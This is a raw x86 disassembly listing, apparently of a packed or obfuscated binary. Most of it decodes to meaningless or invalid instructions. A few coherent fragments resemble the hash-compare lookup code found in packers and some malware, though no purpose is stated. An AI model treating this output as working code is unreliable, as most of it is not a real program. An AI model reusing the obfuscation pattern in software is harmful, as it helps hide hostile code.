  40bb7d:	scas   eax,DWORD PTR es:[edi]
  40bb7e:	push   esp
  40bb7f:	(bad)  
  40bb80:	pop    ds
  40bb81:	xchg   ebp,eax
  40bb82:	icebp  
  40bb83:	cwde   
  40bb84:	or     al,0xe0
  40bb86:	adc    cl,al
  40bb88:	cmp    eax,0xd2df9244
  40bb8d:	aaa    
  40bb8e:	aas    
  40bb8f:	jae    0x40bbaf
  40bb91:	cmp    DWORD PTR [eax+edx*4-0x3d],ecx
  40bb95:	stos   BYTE PTR es:[edi],al
  40bb96:	dec    ebx
  40bb97:	add    DWORD PTR [edx],esp
  40bb99:	js     0x40bb96
  40bb9b:	daa    
  40bb9c:	neg    BYTE PTR [ebx-0x2d]
  40bb9f:	push   edi
  40bba0:	pop    ss
  40bba1:	dec    ebp
  40bba2:	pop    ecx
  40bba3:	add    esp,DWORD PTR [edi+0x15]
  40bba6:	adc    DWORD PTR [eax+0x1e],ebp
  40bba9:	jp     0x40bc2a
  40bbab:	(bad)  [ebx+0x43112cbe]
  40bbb1:	jmp    0x40bb78
  40bbb3:	leave  
  40bbb4:	mov    cl,0xe9
  40bbb6:	jl     0x40bc2d
  40bbb8:	or     eax,0x600d1bef
  40bbbd:	stos   DWORD PTR es:[edi],eax
  40bbbe:	fist   WORD PTR [ecx]
  40bbc0:	mov    esp,0xd4aea8fc
  40bbc5:	leave  
  40bbc6:	cmc    
  40bbc7:	sub    dl,BYTE PTR [edx-0x45]
  40bbca:	inc    esi
  40bbcb:	or     bl,0xb5
  40bbce:	dec    edx
  40bbcf:	ds sbb eax,0xa9f014d
  40bbd5:	repnz leave 
  40bbd7:	aam    0x7
  40bbd9:	push   ecx
  40bbda:	rol    BYTE PTR [ebx],1
  40bbdc:	aad    0xb0
  40bbde:	push   eax
  40bbdf:	into   
  40bbe0:	cwde   
  40bbe1:	aas    
  40bbe2:	ucomiss xmm7,DWORD PTR [ecx+0x4b]
  40bbe6:	outs   dx,DWORD PTR ds:[esi]
  40bbe7:	sar    BYTE PTR [ecx+0x22],1
  40bbea:	mov    dl,0xc8
  40bbec:	fmul   st,st(3)
  40bbee:	or     eax,esp
  40bbf0:	mov    ds,ebp
  40bbf2:	mov    bh,0x76
  40bbf4:	cmc    
  40bbf5:	jbe    0x40bbc7
  40bbf7:	loopne 0x40bbe7
  40bbf9:	push   edx
  40bbfa:	imul   ebp,DWORD PTR [eax],0x984a00ed
  40bc00:	jg     0x40bba6
  40bc02:	inc    ecx
  40bc03:	(bad)  [edx]
  40bc05:	pop    edi
  40bc06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc07:	es pop ebx
  40bc09:	jmp    0x910d:0xd8882618
  40bc10:	or     ah,BYTE PTR [ebp-0x2cf77017]
  40bc16:	lods   al,BYTE PTR ds:[esi]
  40bc17:	test   al,0xf3
  40bc19:	imul   ebp,DWORD PTR [edx-0x3f35cf4d],0x31
  40bc20:	jne    0x40bc30
  40bc22:	fstp   TBYTE PTR [eax]
  40bc24:	and    BYTE PTR [edi+0x67],al
  40bc27:	loop   0x40bc1d
  40bc29:	add    esi,ebp
  40bc2b:	cld    
  40bc2c:	das    
  40bc2d:	test   al,0xa5
  40bc2f:	es das 
  40bc31:	mov    eax,fs:0xd14fdac9
  40bc37:	xor    ch,BYTE PTR [esi-0x45]
  40bc3a:	mov    dh,0xcd
  40bc3c:	push   ebx
  40bc3d:	sbb    DWORD PTR [ebp+esi*8+0x4a],0xd3dfe85a
  40bc45:	or     DWORD PTR [ecx-0xe5c5617],edx
  40bc4b:	push   edi
  40bc4c:	sbb    al,0x31
  40bc4e:	xchg   esi,esi
  40bc50:	cmp    ch,al
  40bc52:	int    0x66
  40bc54:	std    
  40bc55:	mov    al,ds:0x8c0c8b7b
  40bc5a:	pop    ss
  40bc5b:	(bad)
  40bc5e:	movzx  eax,WORD PTR cs:[eax+edi*2]
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	xchg   esp,eax
  40bc96:	mov    edi,0xfbc6f134
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	inc    eax
  40bca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bca3:	mov    bh,0x0
  40bca5:	inc    ebp
  40bca6:	inc    eax
  40bca7:	and    al,0xa1
  40bca9:	fs repz rcl dl,0x1e
  40bcae:	mov    ch,0x1b
  40bcb0:	pushf  
  40bcb1:	xchg   edi,eax
  40bcb2:	mov    ah,0xf1
  40bcb4:	mov    al,0x14
  40bcb6:	jnp    0x40bcbc
  40bcb8:	test   BYTE PTR [ecx-0x3a],bl
  40bcbb:	cmp    bh,al
  40bcbd:	out    dx,eax
  40bcbe:	ins    BYTE PTR es:[edi],dx
  40bcbf:	cwde   
  40bcc0:	ret    0xed17
  40bcc3:	pop    ds
  40bcc4:	mov    bh,0xe
  40bcc6:	retf   
  40bcc7:	int3   
  40bcc8:	pop    edi
  40bcc9:	pop    ss
  40bcca:	mov    al,0x4d
  40bccc:	in     al,0xf
  40bcce:	(bad)  
  40bccf:	aaa    
  40bcd0:	dec    eax
  40bcd1:	add    al,0x3b
  40bcd3:	pandn  mm5,QWORD PTR [esi]
  40bcd6:	xor    BYTE PTR [edi+ebp*8-0x72],cl
  40bcda:	(bad)  [eax+0x6d]
  40bcdd:	sbb    ebx,esp
  40bcdf:	(bad)  
  40bce0:	hlt    
  40bce1:	ins    DWORD PTR es:[edi],dx
  40bce2:	pop    esi
  40bce3:	push   ebx
  40bce4:	stos   DWORD PTR es:[edi],eax
  40bce5:	stc    
  40bce6:	pop    ebx
  40bce7:	(bad)
  40bceb:	or     al,0x54
  40bced:	and    DWORD PTR [ebp-0x6e0b211],ebp
  40bcf3:	and    ah,BYTE PTR [edi*2+0x74a526b1]
  40bcfa:	xchg   esp,eax
  40bcfb:	or     DWORD PTR [ebx],0x8e7ad329
  40bd01:	lea    edi,[ebx+0x3f2f40c1]
  40bd07:	(bad)  
  40bd08:	push   esp
  40bd09:	ret    
  40bd0a:	(bad)  
  40bd0c:	je     0x40bd63
  40bd0e:	mov    WORD PTR [ebp-0xe],es
  40bd11:	push   ebp
  40bd12:	pop    es
  40bd13:	jmp    0xe54:0x2e598a1b
  40bd1a:	repnz push esp
  40bd1c:	inc    edi
  40bd1d:	fbld   TBYTE PTR [edi+eax*4-0x4fb94083]
  40bd24:	jp     0x40bd3a
  40bd26:	rcr    DWORD PTR [ecx-0x63],cl
  40bd29:	(bad)  
  40bd2a:	xor    bh,BYTE PTR [ebx-0x18]
  40bd2d:	ffree  st(4)
  40bd2f:	cld    
  40bd30:	sub    ch,bh
  40bd32:	or     ah,BYTE PTR [esi+0x3f380d1a]
  40bd38:	mov    ds:0x4f74bc1a,al
  40bd3d:	inc    ecx
  40bd3e:	cli    
  40bd3f:	xchg   esi,eax
  40bd40:	loop   0x40bd51
  40bd42:	mov    dh,0x62
  40bd44:	mov    dl,0xef
  40bd46:	push   0x2185aeb1
  40bd4b:	inc    eax
  40bd4c:	mov    esp,0xa258e46e
  40bd51:	push   esp
  40bd52:	add    BYTE PTR [edi],0xf5
  40bd55:	push   esi
  40bd56:	call   0xb0732c41
  40bd5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd5c:	js     0x40bd67
  40bd5e:	xor    BYTE PTR [ebx-0x74],cl
  40bd61:	xor    al,0x84
  40bd63:	sbb    ebp,DWORD PTR [esi+0x7b2ffbbe]
  40bd69:	addr16 cdq 
  40bd6b:	xchg   ebx,eax
  40bd6c:	xor    al,0x9f
  40bd6e:	sub    eax,0x98a773e7
  40bd73:	jg     0x40bd1d
  40bd75:	sub    ah,BYTE PTR [ecx-0x77]
  40bd78:	cmp    DWORD PTR [eax+0x199e1599],edx
  40bd7e:	outs   dx,BYTE PTR ds:[esi]
  40bd7f:	popa   
  40bd80:	push   eax
  40bd81:	fild   QWORD PTR [ebp+0x4e]
  40bd84:	mov    ebp,?
  40bd86:	sbb    BYTE PTR [ebx-0x6d],0xea
  40bd8a:	sub    DWORD PTR [ebp+0x7a],edx
  40bd8d:	rdtsc  
  40bd8f:	sbb    BYTE PTR [ebp-0x65],ch
  40bd92:	push   DWORD PTR [esi-0x6baec87e]
  40bd98:	(bad)  [ebx]
  40bd9a:	ins    DWORD PTR es:[edi],dx
  40bd9b:	fbld   TBYTE PTR [esi+0x3c]
  40bd9e:	test   esi,ebx
  40bda0:	push   esp
  40bda1:	cmp    ebp,eax
  40bda3:	popf   
  40bda4:	xchg   DWORD PTR [ebx+0x43],esi
  40bda7:	out    0xcb,al
  40bda9:	sahf   
  40bdaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdab:	xor    ecx,edx
  40bdad:	call   0x3458:0xefd6c2bb
  40bdb4:	test   esp,edx
  40bdb6:	pop    ss
  40bdb7:	inc    esi
  40bdb8:	aam    0x6
  40bdba:	dec    esp
  40bdbb:	mov    ds:0x529fb80f,al
  40bdc0:	rol    bh,0x51
  40bdc3:	ret    0x6cc9
  40bdc6:	mov    ah,0xc8
  40bdc8:	push   esp
  40bdca:	mov    cl,0x9b
  40bdcc:	out    dx,eax
  40bdcd:	popa   
  40bdce:	inc    ebp
  40bdcf:	popf   
  40bdd0:	mov    BYTE PTR [eax],cl
  40bdd2:	and    eax,0x1462c095
  40bdd7:	fwait
  40bdd8:	adc    esi,edi
  40bdda:	inc    eax
  40bddc:	dec    ebp
  40bddd:	mov    cl,BYTE PTR [ecx]
  40bddf:	dec    esi
  40bde0:	cmp    BYTE PTR [edi],bh
  40bde2:	push   ebp
  40bde3:	(bad)  
  40bde4:	mov    ah,0x50
  40bde6:	mov    bh,0xff
  40bde8:	or     eax,0x7429871d
  40bded:	(bad)
  40bdf0:	mov    edi,0x5b8108ab
  40bdf5:	(bad)  [ebp-0x5404d15c]
  40bdfb:	retf   
  40bdfc:	jae    0x40bd8a
  40bdfe:	outs   dx,BYTE PTR ds:[esi]
  40bdff:	scas   eax,DWORD PTR es:[edi]
  40be00:	idiv   DWORD PTR [ecx-0x46]
  40be03:	jno    0x40bda5
  40be05:	push   edx
  40be06:	push   edi
  40be07:	cld    
  40be08:	push   edx
  40be09:	mov    bl,0xac
  40be0b:	stos   BYTE PTR es:[edi],al
  40be0c:	dec    esp
  40be0d:	add    edi,DWORD PTR [ebp+0x4e410498]
  40be13:	std    
  40be14:	cli    
  40be15:	add    al,0xbc
  40be17:	idiv   BYTE PTR ds:[ebx-0x27]
  40be1b:	ja     0x40be55
  40be1d:	cmp    DWORD PTR [ecx],edi
  40be1f:	mov    ?,WORD PTR [ebx-0x1cecd8c6]
  40be25:	lods   al,BYTE PTR ds:[esi]
  40be26:	cmp    BYTE PTR [ebp+0x7d3e05],0xe9
  40be2d:	adc    esp,ebp
  40be2f:	push   0xc14436ce
  40be34:	mov    dh,0x1a
  40be36:	mov    BYTE PTR [eax-0x2d23446d],bl
  40be3c:	addr16 sti 
  40be3e:	sahf   
  40be3f:	and    edx,edi
  40be41:	sbb    edx,0xccee2179
  40be47:	iret   
  40be48:	addr16 cmp esp,esp
  40be4b:	fsubr  DWORD PTR [ebx-0x26]
  40be4e:	lds    esi,FWORD PTR [esi+0x4e]
  40be51:	ss int 0xaa
  40be54:	fcom   DWORD PTR [esi]
  40be56:	jg     0x4ec3ea96
  40be5c:	fmul   QWORD PTR [ebx]
  40be5e:	ins    BYTE PTR es:[edi],dx
  40be5f:	or     eax,0xd6c19667
  40be64:	in     eax,dx
  40be65:	mov    edx,ebx
  40be67:	push   edi
  40be68:	mov    eax,ds:0x8151cb59
  40be6d:	mov    al,0x2e
  40be6f:	sub    edx,DWORD PTR [eax]
  40be71:	mov    eax,0x9138270c
  40be76:	fsubr  QWORD PTR [ebp-0x2ef2228c]
  40be7c:	ja     0x40beaa
  40be7e:	jno    0x40be43
  40be80:	or     bh,BYTE PTR [eax]
  40be82:	cmc    
  40be83:	xchg   DWORD PTR [edx],ebx
  40be85:	sub    al,0x66
  40be87:	data16 mov cl,0xab
  40be8a:	mov    ds:0xcde70108,eax
  40be8f:	jns    0x40bf04
  40be91:	(bad)  
  40be92:	and    cl,BYTE PTR [esi+edx*1-0x42]
  40be96:	and    edi,edi
  40be98:	shl    BYTE PTR [ebx],cl
  40be9a:	push   cs
  40be9b:	jecxz  0x40be4f
  40be9d:	jp     0x40beb4
  40be9f:	inc    ebx
  40bea0:	inc    ebx
  40bea1:	pop    es
  40bea2:	xor    BYTE PTR [ebp+0x39],bl
  40bea5:	mov    ebx,0xad6dd62d
  40beaa:	sbb    eax,0x8eb1db2
  40beaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40beb0:	push   ecx
  40beb1:	or     BYTE PTR [ecx+0x469b0504],0x5
  40beb8:	or     eax,0x67710ec
  40bebd:	bnd js 0x40be87
  40bec0:	jl     0x40be8e
  40bec2:	lods   al,BYTE PTR ds:[esi]
  40bec3:	mov    ah,0x35
  40bec5:	xor    DWORD PTR [eax-0x11],ecx
  40bec8:	sbb    eax,0x86bbf82a
  40becd:	shl    ecx,cl
  40becf:	xchg   edi,eax
  40bed0:	push   edi
  40bed1:	ficom  WORD PTR [eax]
  40bed3:	xor    ah,ch
  40bed5:	je     0x40be77
  40bed7:	sub    eax,DWORD PTR [ecx+0x502e409]
  40bedd:	ds icebp 
  40bedf:	mov    ch,0x39
  40bee1:	add    esp,DWORD PTR [edx-0x2c0f5173]
  40bee7:	xor    eax,0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x218abfcf]
  40bf27:	cld    
  40bf28:	cmp    cl,0x7e
  40bf2b:	jle    0x40bf65
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf7a
  40bf31:	inc    esi
  40bf32:	lods   eax,DWORD PTR ds:[esi]
  40bf33:	cmp    eax,0x963a3279
  40bf38:	dec    ebp
  40bf39:	push   ds
  40bf3a:	jmp    0x40bf14
  40bf3c:	aad    0xd3
  40bf3e:	outs   dx,BYTE PTR ds:[esi]
  40bf3f:	popa   
  40bf40:	test   BYTE PTR [ebp+0x532c40e5],0x84
  40bf47:	or     eax,0xb2acabea
  40bf4c:	xchg   edx,eax
  40bf4d:	xchg   edi,eax
  40bf4e:	adc    edi,DWORD PTR [esi+0x6b77aabc]
  40bf54:	push   0x4401f215
  40bf59:	mov    esi,0x4a14f647
  40bf5e:	iret   
  40bf5f:	fst    DWORD PTR [eax]
  40bf61:	adc    DWORD PTR [ecx],edi
  40bf63:	(bad)  
  40bf64:	(bad)  
  40bf65:	and    BYTE PTR [ebx],dh
  40bf67:	adc    al,0x54
  40bf69:	cs mov al,0xb5
  40bf6c:	and    eax,0x3ab9b487
  40bf71:	inc    ecx
  40bf72:	sub    DWORD PTR [ebp+ebp*4-0x287b07a4],edi
  40bf79:	fs pop ecx
  40bf7b:	jge    0x40bfdc
  40bf7d:	cmc    
  40bf7e:	cmp    eax,0xf8e925d6
  40bf83:	xchg   esp,eax
  40bf84:	addr16 aad 0x85
  40bf87:	scas   al,BYTE PTR es:[edi]
  40bf88:	hlt    
  40bf89:	mov    al,ds:0x113dfbba
  40bf8e:	pushf  
  40bf8f:	lea    eax,[esi]
  40bf91:	cmp    bl,BYTE PTR [edi]
  40bf93:	std    
  40bf94:	xchg   ebx,eax
  40bf95:	les    ecx,FWORD PTR [ebp-0x1b]
  40bf98:	xor    eax,ebp
  40bf9a:	into   
  40bf9b:	shr    BYTE PTR [ebp-0x72],0xa7
  40bf9f:	pushf  
  40bfa0:	loopne 0x40bf41
  40bfa2:	(bad)  [ecx-0x74]
  40bfa5:	lds    eax,FWORD PTR [esi+0x3903bc6c]
  40bfab:	xor    ecx,DWORD PTR [eax+0x78]
  40bfae:	lock pop esi
  40bfb0:	seto   BYTE PTR [eax+0x5480fd13]
  40bfb7:	or     eax,0xbe83e58b
  40bfbc:	inc    ecx
  40bfbd:	dec    ecx
  40bfbe:	dec    edi
  40bfbf:	sbb    eax,DWORD PTR [ebx-0x5c]
  40bfc2:	xchg   edi,eax
  40bfc3:	jmp    0xe9f668ac
  40bfc8:	xchg   ebp,eax
  40bfc9:	and    DWORD PTR [esi],edx
  40bfcb:	fisttp WORD PTR [ecx-0xc]
  40bfce:	push   edx
  40bfcf:	or     al,0x4c
  40bfd1:	jno    0x40bffa
  40bfd3:	xchg   ecx,eax
  40bfd4:	push   ebp
  40bfd5:	and    dh,BYTE PTR [ebx+0x47]
  40bfd8:	xor    eax,0xd702dd2c
  40bfdd:	inc    edi
  40bfde:	cmp    ebx,edi
  40bfe0:	xadd   BYTE PTR [edi+0x18],dl
  40bfe4:	cmc    
  40bfe5:	in     al,0x8d
  40bfe7:	outs   dx,BYTE PTR ds:[esi]
  40bfe8:	call   0xdd1bf371
  40bfed:	dec    eax
  40bfee:	jl     0x40bfe3
  40bff0:	sar    BYTE PTR [ebp+eiz*8+0x73],1
  40bff4:	dec    eax
  40bff5:	xor    ecx,esp
  40bff7:	and    eax,0x55614033
  40bffc:	loop   0x40c00e
  40bffe:	ficomp WORD PTR [ecx+0x60]
  40c001:	mov    bl,0x30
  40c003:	sbb    eax,0xabb17d0f
  40c008:	add    DWORD PTR [eax+ecx*4],edx
  40c00b:	or     edi,DWORD PTR [ebx]
  40c00d:	aad    0x3f
  40c00f:	retf   0x55f7
  40c012:	sbb    DWORD PTR [eax],ecx
  40c014:	jae    0x40c067
  40c016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c017:	xor    edi,edx
  40c019:	push   ebx
  40c01a:	call   0x41a2:0x290369d0
  40c021:	stc    
  40c022:	sbb    esp,DWORD PTR [esi-0x55]
  40c025:	and    bh,dh
  40c027:	push   cs
  40c028:	mov    al,ds:0x5b6ad391
  40c02d:	xor    esp,DWORD PTR [ecx]
  40c02f:	xor    eax,0x8a1963cd
  40c034:	add    esi,DWORD PTR [esi+edi*1-0x69]
  40c038:	push   eax
  40c039:	imul   ebx,DWORD PTR [esi-0x25],0xffffff85
  40c03d:	mov    cl,0x4f
  40c03f:	push   ds
  40c040:	pop    edx
  40c041:	add    BYTE PTR [edi-0x54],cl
  40c044:	sub    dh,BYTE PTR [bx+0x2]
  40c048:	or     bl,al
  40c04a:	xchg   BYTE PTR [eax+edi*2+0x5d4e0d77],bh
  40c051:	lods   al,BYTE PTR ds:[esi]
  40c052:	es jb  0x40c095
  40c055:	shl    DWORD PTR [eax],cl
  40c057:	pop    edi
  40c058:	ficomp WORD PTR [edi+esi*1]
  40c05b:	in     al,dx
  40c05c:	sti    
  40c05d:	push   ebx
  40c05e:	lods   eax,DWORD PTR ds:[esi]
  40c05f:	adc    eax,0xfb2a81ce
  40c064:	aad    0xc0
  40c066:	sub    esp,DWORD PTR [edi-0x60]
  40c069:	mov    ds:0xf09d0f8f,al
  40c06e:	inc    esi
  40c06f:	ins    BYTE PTR es:[edi],dx
  40c070:	jmp    0x40c014
  40c072:	in     al,dx
  40c073:	and    ah,bh
  40c075:	into   
  40c076:	scas   eax,DWORD PTR es:[edi]
  40c077:	shr    DWORD PTR [esi+0x3a],cl
  40c07a:	in     eax,0xec
  40c07c:	sti    
  40c07d:	in     eax,0x6b
  40c07f:	xor    DWORD PTR [esi-0x14],ebx
  40c082:	mov    ecx,DWORD PTR ds:0x222198c7
  40c088:	cmp    eax,0x378b0b0b
  40c08d:	scas   al,BYTE PTR es:[edi]
  40c08e:	mov    al,ds:0xa77809ed
  40c093:	cmp    ecx,DWORD PTR [esi]
  40c095:	mov    dh,0x44
  40c097:	lods   eax,DWORD PTR ds:[esi]
  40c098:	dec    edx
  40c099:	mov    eax,DWORD PTR [esi+0x52]
  40c09c:	jbe    0x40c08a
  40c09e:	push   esp
  40c09f:	xor    cl,BYTE PTR [eiz*2+0x3d75e20a]
  40c0a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0a7:	push   edi
  40c0a8:	xlat   BYTE PTR ds:[ebx]
  40c0a9:	sub    al,BYTE PTR [eax]
  40c0ab:	dec    ecx
  40c0ac:	arpl   WORD PTR [ebx],dx
  40c0ae:	ret    
  40c0af:	iret   
  40c0b0:	into   
  40c0b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0b2:	out    dx,eax
  40c0b3:	enter  0x551c,0x82
  40c0b7:	cmp    BYTE PTR [edi+0x20],al
  40c0ba:	popf   
  40c0bb:	and    edi,ebp
  40c0bd:	cs and al,0x56
  40c0c0:	sbb    al,0x76
  40c0c2:	or     ch,0x58
  40c0c5:	mov    ds:0xf352fc6,al
  40c0ca:	call   DWORD PTR [edi]
  40c0cc:	pop    edi
  40c0cd:	out    0x51,eax
  40c0cf:	add    eax,0xbc3736d0
  40c0d4:	ret    
  40c0d5:	lock or bl,0xb9
  40c0d9:	repnz adc BYTE PTR [edi-0x6161f7d9],cl
  40c0e0:	mov    cl,0x36
  40c0e2:	mov    al,ds:0xb482189b
  40c0e7:	rcl    ecx,0xf1
  40c0ea:	test   bl,cl
  40c0ec:	dec    edx
  40c0ed:	jbe    0x40c148
  40c0ef:	shl    ecx,1
  40c0f1:	sub    al,0x82
  40c0f3:	jle    0x40c101
  40c0f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0f6:	adc    DWORD PTR [edx],eax
  40c0f8:	test   BYTE PTR [esi],al
  40c0fa:	xor    DWORD PTR [edx],esp
  40c0fc:	mov    ebp,0x3f745e1c
  40c101:	sar    bl,cl
  40c103:	bound  edi,QWORD PTR [ebx]
  40c105:	xor    al,0xca
  40c107:	inc    eax
  40c108:	out    0xf6,eax
  40c10a:	iret   
  40c10b:	mov    ch,BYTE PTR [ebx]
  40c10d:	inc    ebx
  40c10e:	mov    DWORD PTR [edx],esp
  40c110:	or     DWORD PTR [ecx+0x3cd6c987],esi
  40c116:	push   cs
  40c117:	lods   al,BYTE PTR ds:[esi]
  40c118:	mov    esp,0x91b49194
  40c11d:	pop    ecx
  40c11e:	xlat   BYTE PTR ds:[ebx]
  40c11f:	dec    ebp
  40c120:	adc    ebp,esi
  40c122:	leave  
  40c123:	lods   eax,DWORD PTR ds:[esi]
  40c124:	mov    eax,0x4a82edc7
  40c129:	icebp  
  40c12a:	dec    eax
  40c12b:	stos   BYTE PTR es:[edi],al
  40c12c:	lock enter 0xb5d1,0xee
  40c131:	std    
  40c132:	test   BYTE PTR [ebp-0x5be1cc79],dl
  40c138:	push   edx
  40c139:	call   0x397d:0xb1adc723
  40c140:	lock push DWORD PTR [edi]
  40c143:	inc    ecx
  40c144:	fs or  eax,0x1c1aefa3
  40c14a:	inc    esi
  40c14b:	popa   
  40c14c:	pop    ebx
  40c14d:	aaa    
  40c14e:	sub    BYTE PTR gs:[edi-0x1a],al
  40c152:	sub    eax,0x99e0433f
  40c157:	(bad)
  40c15b:	or     al,0xb8
  40c15d:	and    esi,eax
  40c15f:	int    0xd6
  40c161:	xor    dl,BYTE PTR [ebx+0x14b0288b]
  40c167:	and    ah,cl
  40c169:	inc    ebp
  40c16a:	aad    0x8b
  40c16c:	xor    edi,DWORD PTR ds:0x5e570250
  40c172:	cmp    ebx,DWORD PTR [eax-0x34788450]
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xb9
  40c196:	add    al,0xf6
  40c198:	mov    edi,0x7e7e874a
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1a2:	xchg   ecx,eax
  40c1a3:	in     al,0x60
  40c1a5:	mov    dl,0xdc
  40c1a7:	(bad)  [edi-0x44]
  40c1aa:	dec    eax
  40c1ab:	pop    ebx
  40c1ac:	xchg   ebx,eax
  40c1ad:	xchg   ebx,eax
  40c1ae:	int    0x21
  40c1b0:	cs and ecx,ecx
  40c1b3:	mov    ebx,0x4cd928c9
  40c1b8:	sbb    eax,0xe0891b22
  40c1bd:	aad    0x81
  40c1bf:	sub    eax,0xfc81e81c
  40c1c4:	sbb    BYTE PTR [ecx],al
  40c1c6:	jae    0x40c18a
  40c1c8:	cmp    BYTE PTR [edi+0xe28cbb1],cl
  40c1ce:	fxch   st(5)
  40c1d0:	shl    DWORD PTR [ebx],1
  40c1d2:	neg    al
  40c1d4:	stc    
  40c1d5:	mov    al,0x69
  40c1d7:	pop    ebx
  40c1d8:	xor    bl,BYTE PTR [edi+ebx*1]
  40c1db:	fsubr  DWORD PTR [edx-0x61]
  40c1de:	cmp    dh,ch
  40c1e0:	das    
  40c1e1:	pop    edi
  40c1e2:	jecxz  0x40c213
  40c1e4:	cwde   
  40c1e5:	jae    0x40c248
  40c1e7:	sub    cl,BYTE PTR [esi]
  40c1e9:	inc    edx
  40c1ea:	or     cl,BYTE PTR [eax-0x7d513b66]
  40c1f0:	push   eax
  40c1f1:	es mov edi,0xf594cd61
  40c1f7:	mov    ebp,DWORD PTR [edi-0x48]
  40c1fa:	aas    
  40c1fb:	cld    
  40c1fc:	or     al,0x32
  40c1fe:	dec    ecx
  40c1ff:	mov    esp,0xfa417567
  40c204:	add    ecx,DWORD PTR [edx-0x36399c79]
  40c20a:	aaa    
  40c20b:	aas    
  40c20c:	cmp    ah,BYTE PTR [edx]
  40c20e:	xor    esi,DWORD PTR [edi+0x5e]
  40c211:	(bad)  
  40c212:	js     0x40c1c2
  40c214:	pop    es
  40c215:	sub    eax,0x613b2d4f
  40c21a:	and    BYTE PTR [edx+ebx*1-0x4d],0x65
  40c21f:	xlat   BYTE PTR ds:[ebx]
  40c220:	scas   al,BYTE PTR es:[edi]
  40c221:	enter  0x5c31,0x34
  40c225:	fild   QWORD PTR [eax+0x3e658f84]
  40c22b:	jl     0x40c208
  40c22d:	enter  0x192e,0xa8
  40c231:	push   ebp
  40c232:	ins    BYTE PTR es:[edi],dx
  40c233:	clc    
  40c234:	sub    al,ch
  40c236:	je     0x40c2ad
  40c238:	pusha  
  40c239:	adc    BYTE PTR [edi-0x7eaa8d60],ch
  40c23f:	dec    edi
  40c240:	inc    edi
  40c241:	mov    eax,0xfee2baeb
  40c246:	sahf   
  40c247:	in     al,dx
  40c248:	stc    
  40c249:	fldenv ds:0x901ffd24
  40c24f:	js     0x40c241
  40c251:	xchg   ecx,eax
  40c252:	add    eax,0x5a912e0
  40c257:	inc    edx
  40c258:	dec    esp
  40c259:	sub    ch,ch
  40c25b:	stos   BYTE PTR es:[edi],al
  40c25c:	inc    ebx
  40c25d:	push   eax
  40c25e:	std    
  40c25f:	retf   0x74
  40c262:	mov    al,ds:0xfc1a2227
  40c267:	mov    dl,0x78
  40c269:	loope  0x40c241
  40c26b:	cwde   
  40c26c:	push   ss
  40c26d:	and    al,0xf2
  40c26f:	in     eax,dx
  40c270:	jle    0x40c2e5
  40c272:	iret   
  40c273:	push   es
  40c274:	xchg   ecx,eax
  40c275:	sub    eax,0xb09031c5
  40c27a:	pop    edi
  40c27b:	pop    es
  40c27c:	mov    al,0xe8
  40c27e:	pop    ebx
  40c27f:	pop    ebp
  40c280:	mov    ah,0x5e
  40c282:	sbb    bl,BYTE PTR [edi]
  40c284:	popf   
  40c285:	sbb    al,cl
  40c287:	add    ebp,0x38
  40c28a:	test   DWORD PTR ss:0xc09121ca,ebp
  40c291:	push   es
  40c292:	mov    ch,0xcf
  40c294:	std    
  40c295:	xor    dh,bl
  40c297:	and    ecx,eax
  40c299:	inc    edx
  40c29a:	sti    
  40c29b:	add    al,BYTE PTR [edi-0x40047784]
  40c2a1:	inc    edi
  40c2a2:	and    esp,esp
  40c2a4:	xchg   edi,eax
  40c2a5:	inc    eax
  40c2a6:	sahf   
  40c2a7:	inc    esp
  40c2a8:	sub    eax,0xc8366c5d
  40c2ad:	or     DWORD PTR [edx-0x68ba534e],edx
  40c2b3:	xchg   ebx,eax
  40c2b4:	or     ch,bl
